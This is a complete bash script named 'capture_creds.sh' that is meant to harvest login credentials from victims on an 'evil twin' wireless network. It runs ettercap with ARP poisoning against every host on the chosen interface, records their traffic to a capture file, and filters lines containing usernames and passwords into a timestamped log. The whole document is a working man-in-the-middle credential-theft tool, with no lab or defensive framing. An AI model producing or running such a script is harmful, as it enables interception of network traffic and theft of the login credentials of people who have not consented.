#!/bin/bash
# capture_creds.sh - Capture credentials from evil twin

INTERFACE=${1:-wlan1}
OUTPUT_DIR=~/captures/creds

mkdir -p "$OUTPUT_DIR"

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOGFILE="${OUTPUT_DIR}/creds_${TIMESTAMP}.txt"

echo "[*] Starting credential capture"
echo "[*] Interface: $INTERFACE"
echo "[*] Log: $LOGFILE"

# Start ettercap in text mode
sudo ettercap -T -q -i "$INTERFACE" -M arp:remote // // -w "${OUTPUT_DIR}/dump_${TIMESTAMP}.pcap" &

ETTERCAP_PID=$!

echo "[*] Ettercap running (PID: $ETTERCAP_PID)"
echo "[*] Monitoring for credentials..."
echo "[*] Press Ctrl+C to stop"

# Monitor for credentials in real-time
sudo tail -f /var/log/ettercap.log 2>/dev/null | while read line; do
    if echo "$line" | grep -qi "USER\|PASS\|password\|username"; then
        echo "$line" | tee -a "$LOGFILE"
    fi
done

trap "sudo kill $ETTERCAP_PID 2>/dev/null; echo '[*] Stopped'" EXIT
wait